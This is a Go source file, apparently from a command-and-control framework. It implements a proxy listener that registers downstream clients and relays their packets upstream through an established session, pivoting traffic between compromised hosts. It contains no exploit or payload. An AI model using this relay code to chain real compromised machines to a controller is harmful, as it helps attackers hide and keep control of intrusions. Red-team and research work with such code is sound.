package c2

import (
	"context"
	"fmt"
	"net"
	"sync/atomic"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device"
)

// Proxy is a struct that controls a Proxied connection between a client and a server and allows for packets to be
// routed through a current established Session.
type Proxy struct {
	ch       chan waker
	done     uint32
	parent   *Session
	clients  []uint32
	listener net.Listener
	connection
}
type proxySwarm struct {
	new      chan *proxyClient
	close    chan uint32
	closers  []func()
	clients  map[uint32]*proxyClient
	register chan func()
}
type proxyClient struct {
	ID device.ID

	send  chan *com.Packet
	peek  *com.Packet
	ready uint32
}

// Wait will block until the current Proxy is closed and shutdown.
func (p *Proxy) Wait() {
	<-p.ch
}
func (p *Proxy) listen() {
	p.log.Trace("[%s:Proxy] Starting listen %q...", p.parent.ID, p.listener)
	for atomic.LoadUint32(&p.done) == flagOpen {
		c, err := p.listener.Accept()
		if err != nil {
			if p.done > flagOpen {
				break
			}
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			p.parent.log.Error("[%s:Proxy] Received error during Listener accept: %s!", p.parent.ID, err.Error())
			if ok && !e.Timeout() && !e.Temporary() {
				break
			}
			continue
		}
		if c == nil {
			continue
		}
		p.log.Trace("[%s:Proxy] Received a connection from %q...", p.parent.ID, c.RemoteAddr().String())
		go p.handle(c)
	}
	p.parent.log.Debug("[%s:Proxy] Stopping Listener...", p.parent.ID)
	p.cancel()
	p.listener.Close()
	if p.done < flagOption {
		for i := range p.clients {
			p.parent.swarm.close <- p.clients[i]
		}
	}
	atomic.StoreUint32(&p.done, flagFinished)
	p.ctx, p.cancel, p.log = nil, nil, nil
	p.w, p.t, p.s, p.Mux = nil, nil, nil, nil
	p.parent, p.clients, p.listener = nil, nil, nil
	close(p.ch)
}
func (p *Proxy) shutdown() {
	if atomic.LoadUint32(&p.done) != flagOpen {
		return
	}
	atomic.StoreUint32(&p.done, flagOption)
	p.listener.Close()
	p.Wait()
}
func (s *proxySwarm) Close() {
	for k, c := range s.clients {
		c.ID, c.peek = nil, nil
		close(c.send)
		delete(s.clients, k)
	}
	for i := range s.closers {
		s.closers[i]()
		s.closers[i] = nil
	}
	close(s.new)
	close(s.close)
	s.new, s.close = nil, nil
	s.clients, s.closers = nil, nil
}

// Close stops the operation of the Proxy and any Sessions that may be connected. Resources used with this
// Proxy will be freed up for reuse.
func (p *Proxy) Close() error {
	if atomic.LoadUint32(&p.done) > flagOpen {
		return nil
	}
	atomic.StoreUint32(&p.done, flagClose)
	err := p.listener.Close()
	p.Wait()
	return err
}

// IsActive returns true if the Proxy is still able to send and receive Packets.
func (p Proxy) IsActive() bool {
	return p.done == flagOpen
}
func (s *proxySwarm) process() {
	for len(s.new) > 0 {
		n := <-s.new
		s.clients[n.ID.Hash()] = n
	}
	for len(s.close) > 0 {
		var (
			i     = <-s.close
			c, ok = s.clients[i]
		)
		if ok {
			c.ID, c.peek = nil, nil
			close(c.send)
			delete(s.clients, i)
		}
	}
	for len(s.register) > 0 {
		s.closers = append(s.closers, <-s.register)
	}
}
func (p *Proxy) handle(c net.Conn) {
	if !p.handlePacket(c, false) {
		c.Close()
		return
	}
	p.log.Debug("[%s:Proxy] %s: Triggered Channel mode, holding open Channel!", p.parent.ID, c.RemoteAddr().String())
	for atomic.LoadUint32(&p.done) == flagOpen {
		if p.handlePacket(c, true) {
			break
		}
	}
	p.log.Debug("[%s:Proxy] %s: Closing Channel..", p.parent.ID, c.RemoteAddr().String())
	c.Close()
}
func (s proxySwarm) tags() []uint32 {
	t := make([]uint32, 0, len(s.clients))
	for i := range s.clients {
		t = append(t, i)
	}
	return t
}
func (s *proxySwarm) accept(n *com.Packet) bool {
	if len(s.clients) == 0 {
		return false
	}
	c, ok := s.clients[n.Device.Hash()]
	if !ok {
		return false
	}
	c.send <- n
	atomic.StoreUint32(&c.ready, 1)
	return true
}
func (c *proxyClient) next(i bool) (*com.Packet, error) {
	if c.peek == nil && len(c.send) == 0 {
		atomic.StoreUint32(&c.ready, 0)
		if i {
			return nil, nil
		}
		return &com.Packet{ID: MvNop, Device: c.ID}, nil
	}
	var (
		p   *com.Packet
		err error
	)
	if c.peek != nil {
		p, c.peek = c.peek, nil
	} else {
		p = <-c.send
	}
	if len(c.send) == 0 && p.Verify(c.ID) {
		if p.ID != MvNop {
			atomic.StoreUint32(&c.ready, 1)
		}
		return p, nil
	}
	if p, c.peek, err = nextPacket(c.send, p, c.ID); err != nil {
		return nil, err
	}
	atomic.StoreUint32(&c.ready, 1)
	return p, nil
}
func (p *Proxy) handlePacket(c net.Conn, o bool) bool {
	d, err := readPacket(c, p.w, p.t)
	if err != nil {
		p.log.Warning("[%s:Proxy] %s: Error occurred during Packet read: %s!", p.parent.ID, c.RemoteAddr().String(), err.Error())
		return o
	}
	z := p.resolveTags(c.RemoteAddr().String(), p.parent.ID, d.Device, o, d.Tags)
	if d.Flags&com.FlagMultiDevice == 0 {
		if s := p.client(c, d); s != nil {
			n, err := s.next(false)
			if err != nil {
				p.log.Warning("[%s:Proxy:%s] %s: Received an error retriving Packet data: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
				return d.Flags&com.FlagChannel != 0
			}
			if len(z) > 0 {
				p.log.Trace("[%s:Proxy:%s] %s: Resolved Tags added %d Packets!", p.parent.ID, s.ID, c.RemoteAddr().String(), len(z))
				u := &com.Packet{ID: MvMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
				n.MarshalStream(u)
				for i := 0; i < len(z); i++ {
					z[i].MarshalStream(u)
				}
				u.Flags.SetLen(uint16(len(z) + 1))
				u.Close()
				n = u
			}
			p.log.Trace("[%s:Proxy:%s] %s: Sending Packet %q to client...", p.parent.ID, s.ID, c.RemoteAddr().String(), n.String())
			if err = writePacket(c, p.w, p.t, n); err != nil {
				p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
				return o
			}
		}
		return d.Flags&com.FlagChannel != 0
	}
	x := d.Flags.Len()
	if x == 0 {
		p.log.Warning("[%s:Proxy:%s] %s: Received an invalid multi Packet!", p.parent.ID, d.Device, c.RemoteAddr().String())
		return d.Flags&com.FlagChannel != 0
	}
	var (
		i, t uint16
		n    *com.Packet
		m    = &com.Packet{ID: MvMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
	)
	for ; i < x && p.parent.done == 0; i++ {
		n = new(com.Packet)
		if err := n.UnmarshalStream(d); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error when attempting to read a Packet: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
			return d.Flags&com.FlagChannel != 0
		}
		s := p.client(c, n)
		if s == nil {
			continue
		}
		if r, err := s.next(false); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error retriving Packet data: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
		} else {
			r.MarshalStream(m)
		}
		n.Clear()
		t++
	}
	if len(z) > 0 {
		p.log.Trace("[%s:Proxy:%s] %s: Resolved Tags added %d Packets!", p.parent.ID, d.Device, c.RemoteAddr().String(), len(z))
		for i := 0; i < len(z); i++ {
			z[i].MarshalStream(m)
		}
		t += uint16(len(z))
	}
	m.Flags.SetLen(t)
	m.Close()
	p.log.Trace("[%s:Proxy:%s] %s: Sending Packet %q to client...", p.parent.ID, d.Device, c.RemoteAddr().String(), m.String())
	if err := writePacket(c, p.w, p.t, m); err != nil {
		p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
	}
	return d.Flags&com.FlagChannel != 0
}
func (p *Proxy) client(c net.Conn, d *com.Packet) *proxyClient {
	p.log.Trace("[%s:Proxy:%s] %s: Received a packet %q...", p.parent.ID, d.Device, c.RemoteAddr().String(), d.String())
	if p.parent.done != 0 {
		return nil
	}
	d.Flags |= com.FlagProxy
	var (
		i     = d.Device.Hash()
		s, ok = p.parent.swarm.clients[i]
	)
	if !ok {
		if d.ID != MvHello {
			if len(p.parent.swarm.new) == 0 {
				p.log.Warning("[%s:Proxy:%s] %s: Received a non-hello Packet from a unregistered client!", p.parent.ID, d.Device, c.RemoteAddr().String())
				if err := writePacket(c, p.w, p.t, &com.Packet{ID: MvRegister}); err != nil {
					p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
				}
			}
			return nil
		}
		s = &proxyClient{
			ID:    d.Device,
			send:  make(chan *com.Packet, cap(p.parent.send)),
			ready: 1,
		}
		p.parent.send <- d
		p.parent.swarm.new <- s
		p.clients = append(p.clients, d.Device.Hash())
		if err := writePacket(c, p.w, p.t, &com.Packet{ID: MvComplete, Device: d.Device, Job: d.Job}); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
		}
		p.log.Debug("[%s:Proxy:%s] %s: New client registered as %q hash 0x%X.", p.parent.ID, s.ID, c.RemoteAddr().String(), s.ID, i)
		return nil
	}
	switch {
	case d.ID == MvShutdown:
		p.parent.swarm.close <- i
		p.parent.send <- d
		if err := writePacket(c, p.w, p.t, &com.Packet{ID: MvShutdown, Device: d.Device, Job: d.Job}); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
		}
		return nil
	case d.ID != MvNop || d.Flags&com.FlagMultiDevice != 0:
		atomic.StoreUint32(&s.ready, 1)
		p.parent.send <- d
	}
	return s
}

// Proxy establishes a new listening Proxy connection using the supplied listener that will send any received
// Packets "upstream" via the current Session. Packets destined for hosts connected to this proxy will be routed
// back and forth on this Session. This function will return a wrapped 'ErrUnable' if this is not a client Session.
func (s *Session) Proxy(b string, c serverListener, p *Profile) (*Proxy, error) {
	if s.parent != nil {
		return nil, fmt.Errorf("must be a client session: %w", ErrUnable)
	}
	if c == nil && p != nil {
		c = convertHintListen(p.hint)
	}
	if c == nil {
		return nil, ErrNoConnector
	}
	h, err := c.Listen(b)
	if err != nil {
		return nil, fmt.Errorf("unable to listen on %q: %w", b, err)
	}
	if h == nil {
		return nil, fmt.Errorf("unable to listen on %q", b)
	}
	if s.log == nil {
		s.log = logx.NOP
	}
	l := &Proxy{
		ch:         make(chan waker, 1),
		parent:     s,
		listener:   h,
		connection: connection{s: s.s, log: s.log, w: s.w, t: s.t},
	}
	if p != nil {
		l.w, l.t = p.Wrapper, p.Transform
	}
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	l.log.Debug("[%s] Added Proxy Listener on %q!", s.ID, b)
	if s.swarm == nil {
		s.swarm = &proxySwarm{
			new:      make(chan *proxyClient, 64),
			close:    make(chan uint32, 64),
			clients:  make(map[uint32]*proxyClient),
			register: make(chan func(), 16),
		}
	}
	s.swarm.register <- l.shutdown
	go l.listen()
	return l, nil
}
func (p *Proxy) resolveTags(a string, l, i device.ID, o bool, t []uint32) []*com.Packet {
	var y []*com.Packet
	for x := 0; x < len(t); x++ {
		p.log.Trace("[%s:%s] %s: Received a Tag 0x%X...", l, i, a, t[x])
		s, ok := p.parent.swarm.clients[t[x]]
		if !ok {
			p.log.Warning("[%s:%s] %s: Received an invalid Tag 0x%X!", l, i, a, t[x])
			continue
		}
		n, err := s.next(true)
		if err != nil {
			p.log.Warning("[%s:%s] %s: Received an error retriving Packet data: %s!", l, i, a, err.Error())
			continue
		}
		if n == nil {
			continue
		}
		y = append(y, n)
	}
	return y
}
